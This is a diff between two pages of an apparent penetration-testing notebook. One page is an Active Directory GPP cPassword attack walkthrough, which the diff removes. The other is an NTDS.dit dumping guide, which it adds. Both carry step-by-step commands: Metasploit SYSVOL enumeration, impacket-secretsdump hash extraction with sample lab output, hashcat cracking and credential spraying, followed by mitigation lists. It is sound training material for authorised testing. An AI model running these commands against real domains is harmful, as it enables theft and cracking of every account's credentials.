@@ -8,7 +8,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
-    <title>GPP cPassword Attacks &#8212; MyHackBook</title>
+    <title>Dumping the NTDS.dit &#8212; MyHackBook</title>
   
   
   
@@ -43,11 +43,11 @@
     <script src="../../../_static/doctools.js?v=fd6eb6e6"></script>
     <script src="../../../_static/sphinx_highlight.js?v=6ffebe34"></script>
     <script src="../../../_static/scripts/sphinx-book-theme.js?v=fab101a9"></script>
-    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/post-compromise-attacks/gpp-cPassword-attacks';</script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/post-domain-compromise-attacks/ntds-dumping';</script>
     <link rel="index" title="Index" href="../../../genindex.html" />
     <link rel="search" title="Search" href="../../../search.html" />
-    <link rel="next" title="Post Domain Compromise Attacks" href="../post-domain-compromise-attacks/index.html" />
-    <link rel="prev" title="LNK File Attacks" href="lnk-file-attacks.html" />
+    <link rel="next" title="Golden Ticket" href="golden-ticket.html" />
+    <link rel="prev" title="Post Domain Compromise Attacks" href="index.html" />
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <meta name="docsearch:language" content="en"/>
   <meta name="docsearch:version" content="" />
@@ -170,18 +170,18 @@
 <li class="toctree-l4"><a class="reference internal" href="../enumeration/enumeration-with-bloodhound.html">Enumeration with Bloodhound</a></li>
 </ul>
 </details></li>
-<li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Post Compromise Attacks</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
-<li class="toctree-l4"><a class="reference internal" href="pass-attacks.html">Pass Attacks</a></li>
-<li class="toctree-l4"><a class="reference internal" href="mimikatz.html">Mimikatz</a></li>
-<li class="toctree-l4"><a class="reference internal" href="kerberoasting.html">Kerberoasting</a></li>
-<li class="toctree-l4"><a class="reference internal" href="token-impersonation.html">Token Impersonation</a></li>
-<li class="toctree-l4"><a class="reference internal" href="lnk-file-attacks.html">LNK File Attacks</a></li>
-<li class="toctree-l4 current active"><a class="current reference internal" href="#">GPP cPassword Attacks</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../post-compromise-attacks/index.html">Post Compromise Attacks</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/pass-attacks.html">Pass Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/mimikatz.html">Mimikatz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/kerberoasting.html">Kerberoasting</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/token-impersonation.html">Token Impersonation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/lnk-file-attacks.html">LNK File Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/gpp-cPassword-attacks.html">GPP cPassword Attacks</a></li>
 </ul>
 </details></li>
-<li class="toctree-l3 has-children"><a class="reference internal" href="../post-domain-compromise-attacks/index.html">Post Domain Compromise Attacks</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
-<li class="toctree-l4"><a class="reference internal" href="../post-domain-compromise-attacks/ntds-dumping.html">Dumping the NTDS.dit</a></li>
-<li class="toctree-l4"><a class="reference internal" href="../post-domain-compromise-attacks/golden-ticket.html">Golden Ticket</a></li>
+<li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Post Domain Compromise Attacks</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l4 current active"><a class="current reference internal" href="#">Dumping the NTDS.dit</a></li>
+<li class="toctree-l4"><a class="reference internal" href="golden-ticket.html">Golden Ticket</a></li>
 </ul>
 </details></li>
 </ul>
@@ -269,7 +269,7 @@
       
       
       
-      <li><a href="../../../_sources/Active Directory/attacking-ad/post-compromise-attacks/gpp-cPassword-attacks.md" target="_blank"
+      <li><a href="../../../_sources/Active Directory/attacking-ad/post-domain-compromise-attacks/ntds-dumping.md" target="_blank"
    class="btn btn-sm btn-download-source-button dropdown-item"
    title="Download source file"
    data-bs-placement="left" data-bs-toggle="tooltip"
@@ -345,7 +345,7 @@
               
 
 <div id="jb-print-docs-body" class="onlyprint">
-    <h1>GPP cPassword Attacks</h1>
+    <h1>Dumping the NTDS.dit</h1>
     <!-- Table of contents -->
     <div id="print-main-content">
         <div id="jb-print-toc">
@@ -355,7 +355,14 @@
             </div>
             <nav aria-label="Page">
                 <ul class="visible nav section-nav flex-column">
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#overview">Overview</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#dump-ntds-dit-from-the-domain-controller">1. Dump NTDS.dit from the Domain Controller</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#extract-ntlm-hashes">2. Extract NTLM Hashes</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#crack-the-ntlm-hashes">3. Crack the NTLM Hashes</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#analyze-and-report-results">4. Analyze and Report Results</a></li>
+</ul>
+</li>
 <li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
 </ul>
             </nav>
@@ -368,72 +375,94 @@
 <div id="searchbox"></div>
                 <article class="bd-article">
                   
-  <section id="gpp-cpassword-attacks">
-<h1>GPP cPassword Attacks<a class="headerlink" href="#gpp-cpassword-attacks" title="Link to this heading">#</a></h1>
+  <section id="dumping-the-ntds-dit">
+<h1>Dumping the NTDS.dit<a class="headerlink" href="#dumping-the-ntds-dit" title="Link to this heading">#</a></h1>
+<section id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Link to this heading">#</a></h2>
+<p>The NTDS.dit (NT Directory Services Database) is the primary database file used by Active Directory to store all domain data. This includes:</p>
 <ul class="simple">
-<li><p>Group Policy Preferences (GPP) allowed administrators to create policies with embedded credentials for tasks like service account management.</p></li>
-<li><p>These credentials were encrypted and stored in a “cPassword” field within Group Policy XML files.</p></li>
-<li><p>Microsoft’s encryption key was accidentally released publicly, allowing anyone to decrypt the cPassword values.</p></li>
-<li><p>Patched in MS14-025 (KB2962486), but the patch only prevents creation of new encrypted credentials—it does not remove or decrypt existing vulnerable files.</p></li>
-<li><p>This makes GPP cPassword attacks highly relevant on penetration tests, as legacy deployments often retain old GPP files in SYSVOL.</p></li>
+<li><p><strong>User information</strong>: Account details, properties, and metadata.</p></li>
+<li><p><strong>Group information</strong>: Security groups, distribution groups, and memberships.</p></li>
+<li><p><strong>Security descriptors</strong>: Access control lists (ACLs) and permissions for objects.</p></li>
+<li><p><strong>Password hashes</strong>: NTLM and Kerberos key hashes for all user accounts.</p></li>
 </ul>
+<p>Once you have Domain Administrator access, dumping NTDS.dit provides access to every password hash in the domain. Combined with offline cracking, this can yield plaintext passwords for a significant portion of the domain, along with valuable insights for the penetration test report.</p>
+</section>
 <section id="walkthrough">
 <h2>Walkthrough<a class="headerlink" href="#walkthrough" title="Link to this heading">#</a></h2>
-<ol class="arabic simple">
-<li><p>Enumerate GPP Files from SYSVOL</p></li>
-</ol>
-<p>Use Metasploit’s <code class="docutils literal notranslate"><span class="pre">smb_enum_gpp</span></code> module to access the SYSVOL of the domain controller and extract Group Policy Preference files:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfconsole
-use<span class="w"> </span>auxiliary/scanner/smb/smb_enum_gpp
-<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span>&lt;domain_controller_ip&gt;
-<span class="nb">set</span><span class="w"> </span>SMBUser<span class="w"> </span>&lt;domain_user&gt;
-<span class="nb">set</span><span class="w"> </span>SMBPass<span class="w"> </span>&lt;domain_password&gt;
-<span class="nb">set</span><span class="w"> </span>SMBDomain<span class="w"> </span>&lt;domain_name&gt;
-run
+<section id="dump-ntds-dit-from-the-domain-controller">
+<h3>1. Dump NTDS.dit from the Domain Controller<a class="headerlink" href="#dump-ntds-dit-from-the-domain-controller" title="Link to this heading">#</a></h3>
+<p>The most straightforward method is using <code class="docutils literal notranslate"><span class="pre">secretdump.py</span></code> from the impacket toolkit. This tool extracts credentials directly from the DC without needing physical access to the NTDS.dit file.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Using secretdump with domain admin credentials</span>
+impacket-secretsdump<span class="w"> </span>-just-dc-ntlm<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;domain_controller_ip&gt;
 </pre></div>
 </div>
-<p>Alternatively, you can manually mount SYSVOL and search for XML files containing cPassword:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>//&lt;domain_controller&gt;<span class="se">\S</span>YSVOL<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-o<span class="w"> </span><span class="nv">username</span><span class="o">=</span>&lt;user&gt;,password<span class="o">=</span>&lt;pass&gt;
-grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">&quot;cPassword&quot;</span><span class="w"> </span>/mnt/sysvol
+<p>The hash format is: <code class="docutils literal notranslate"><span class="pre">USERNAME:RID:LM_HASH:NTLM_HASH:::</span></code>. For most modern systems, the LM hash (first hash) can be ignored; focus on the NTLM hash.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>impacket-secretsdump<span class="w"> </span>MARVEL.local/hawkeye:<span class="s1">&#39;Password1@&#39;</span>@10.0.2.18<span class="w"> </span>-just-dc-ntlm
+
+Impacket<span class="w"> </span>v0.12.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2345375a47a92754e2505132aca194b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:50e5806d7c53f975dfbf0e6d57a3a9c1:::
+vboxuser:1000:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
+MARVEL.local<span class="se">\t</span>stark:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+MARVEL.local<span class="se">\S</span>QLService:1106:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
+MARVEL.local<span class="se">\f</span>castle:1107:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+MARVEL.local<span class="se">\p</span>parker:1108:aad3b435b51404eeaad3b435b51404ee:07d128430a6338f8d537f6b3ae1dc136:::
+hawkeye:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
+HYDRA-DC$:1001:aad3b435b51404eeaad3b435b51404ee:228f0d82575bba613346904dae3eaca8:::
+THEPUNISHER$:1109:aad3b435b51404eeaad3b435b51404ee:1f1e600da217cce8d0e5cd190d61f42e:::
+SPIDERMAN$:1110:aad3b435b51404eeaad3b435b51404ee:d0994ac2195e1e81d0f84a2e33f60cfa:::
+HBO$:1112:aad3b435b51404eeaad3b435b51404ee:cb933184b9dc563103819a8c1f4df570:::
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...
 </pre></div>
 </div>
-<ol class="arabic simple" start="2">
-<li><p>Decrypt cPassword Values</p></li>
-</ol>
-<p>Once you identify files with cPassword entries, use tools to decrypt them. Common approaches include:</p>
-<ul>
-<li><p><strong>Using Metasploit decrypt module</strong>:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>use<span class="w"> </span>post/windows/gather/credentials/credential_collector
+</section>
+<section id="extract-ntlm-hashes">
+<h3>2. Extract NTLM Hashes<a class="headerlink" href="#extract-ntlm-hashes" title="Link to this heading">#</a></h3>
+<p>If you’ve dumped the hashes in a format containing both LM and NTLM, extract just the NTLM hashes for cracking:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Extract NTLM hashes from secretdump output</span>
+cat<span class="w"> </span>secretdump_output.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="s1">&#39;:&#39;</span><span class="w"> </span><span class="s1">&#39;{print $4}&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>ntlm_hashes.txt
+
+<span class="c1"># Or using a simple script</span>
+grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;(?&lt;=:)[a-f0-9]{32}:[a-f0-9]{32}(?=:::)&#39;</span><span class="w"> </span>secretdump_output.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d:<span class="w"> </span>-f2<span class="w"> </span>&gt;<span class="w"> </span>ntlm_hashes.txt
 </pre></div>
 </div>
-</li>
-<li><p><strong>Using impacket-Get-GPPPassword</strong> or similar custom tools that implement the known decryption algorithm.</p></li>
-<li><p><strong>Using CyberChef</strong> or <strong>gpp-decrypt</strong> online tools (not recommended for sensitive environments).</p></li>
+</section>
+<section id="crack-the-ntlm-hashes">
+<h3>3. Crack the NTLM Hashes<a class="headerlink" href="#crack-the-ntlm-hashes" title="Link to this heading">#</a></h3>
+<p>Use offline cracking tools to attempt to recover plaintext passwords. Popular options include:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>ntds.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--show
+</pre></div>
+</div>
+</section>
+<section id="analyze-and-report-results">
+<h3>4. Analyze and Report Results<a class="headerlink" href="#analyze-and-report-results" title="Link to this heading">#</a></h3>
+<p>Once you’ve cracked passwords, compile statistics for the client report:</p>
+<ul class="simple">
+<li><p><strong>Total hashes recovered</strong>: Number of domain user accounts.</p></li>
+<li><p><strong>Cracked hashes</strong>: Number of successfully cracked passwords.</p></li>
+<li><p><strong>Crack rate</strong>: Percentage of hashes successfully cracked.</p></li>
+<li><p><strong>Most common passwords</strong>: Identify organizational patterns and weak password choices.</p></li>
+<li><p><strong>Weak password policies</strong>: Highlight accounts with short, simple, or reused passwords.</p></li>
 </ul>
-<ol class="arabic simple" start="3">
-<li><p>Validate and Use Credentials</p></li>
-</ol>
-<p>Test the decrypted credentials on domain systems:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>crackmapexec<span class="w"> </span>smb<span class="w"> </span>&lt;target_range&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;decrypted_password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;
-</pre></div>
-</div>
-<p>Apply lateral movement techniques with the recovered credentials.</p>
+<p>Use tools like Excel, Python (pandas), or dedicated reporting tools to create visualizations that demonstrate password weakness across the organization.</p>
+</section>
 </section>
 <section id="mitigations">
 <h2>Mitigations<a class="headerlink" href="#mitigations" title="Link to this heading">#</a></h2>
-<ul>
-<li><p><strong>Apply MS14-025 (KB2962486)</strong>: Patch all systems to prevent creation of new encrypted credentials in Group Policy Preferences. However, this is not sufficient alone.</p></li>
-<li><p><strong>Delete Legacy GPP XML Files</strong>: Manually remove or audit old GPP XML files stored in <code class="docutils literal notranslate"><span class="pre">\\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\</span></code> that may contain cPassword entries. Use:</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># List all GPP files</span>
-ls<span class="w"> </span>/mnt/sysvol/Policies/*/User/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;.*\.xml&quot;</span>
-
-<span class="c1"># Audit and remove vulnerable Group Policy Objects</span>
-</pre></div>
-</div>
-</li>
-<li><p><strong>Restrict SYSVOL Access</strong>: Limit read access to SYSVOL to only authorized administrators.</p></li>
-<li><p><strong>Monitor for GPP Enumeration</strong>: Alert on unusual SMB connections to domain controllers and SYSVOL access attempts.</p></li>
-<li><p><strong>Use Group Policy Managed Service Accounts (gMSA)</strong>: Replace embedded credentials with gMSA for service accounts, which have auto-rotating passwords managed by the domain.</p></li>
+<ul class="simple">
+<li><p><strong>Enforce Strong Password Policies</strong>: Implement organization-wide password policies requiring minimum length (14+ characters), complexity, and periodic changes.</p></li>
+<li><p><strong>Implement Account Lockout Policies</strong>: Prevent brute-force attacks by locking accounts after failed login attempts.</p></li>
+<li><p><strong>Use Multi-Factor Authentication (MFA)</strong>: Reduce the impact of compromised passwords with MFA on sensitive accounts.</p></li>
+<li><p><strong>Monitor NTDS.dit Access</strong>: Alert on unauthorized attempts to dump or access NTDS.dit on domain controllers.</p></li>
+<li><p><strong>Restrict Domain Admin Accounts</strong>: Limit the number of DA accounts and monitor their usage closely.</p></li>
+<li><p><strong>Passwordless Authentication</strong>: Migrate to passwordless methods (Windows Hello, FIDO2) where possible.</p></li>
+<li><p><strong>Regular Security Audits</strong>: Conduct periodic penetration tests to identify weak passwords and enforce policy compliance.</p></li>
+<li><p><strong>Educate Users</strong>: Implement security awareness training to promote better password hygiene and recognition of social engineering.</p></li>
 </ul>
 </section>
 </section>
@@ -450,20 +479,20 @@ ls<span class="w"> </span>/mnt/sysvol/Policies/*/User/<span class="w"> </span><s
                   
 <div class="prev-next-area">
     <a class="left-prev"
-       href="lnk-file-attacks.html"
+       href="index.html"
        title="previous page">
       <i class="fa-solid fa-angle-left"></i>
       <div class="prev-next-info">
         <p class="prev-next-subtitle">previous</p>
-        <p class="prev-next-title">LNK File Attacks</p>
+        <p class="prev-next-title">Post Domain Compromise Attacks</p>
       </div>
     </a>
     <a class="right-next"
-       href="../post-domain-compromise-attacks/index.html"
+       href="golden-ticket.html"
        title="next page">
       <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Post Domain Compromise Attacks</p>
+        <p class="prev-next-title">Golden Ticket</p>
       </div>
       <i class="fa-solid fa-angle-right"></i>
     </a>
@@ -485,7 +514,14 @@ ls<span class="w"> </span>/mnt/sysvol/Policies/*/User/<span class="w"> </span><s
   </div>
   <nav id="pst-page-toc-nav" class="page-toc" aria-labelledby="pst-page-navigation-heading-2">
     <ul class="visible nav section-nav flex-column">
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#overview">Overview</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#walkthrough">Walkthrough</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#dump-ntds-dit-from-the-domain-controller">1. Dump NTDS.dit from the Domain Controller</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#extract-ntlm-hashes">2. Extract NTLM Hashes</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#crack-the-ntlm-hashes">3. Crack the NTLM Hashes</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#analyze-and-report-results">4. Analyze and Report Results</a></li>
+</ul>
+</li>
 <li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
 </ul>
   </nav></div>
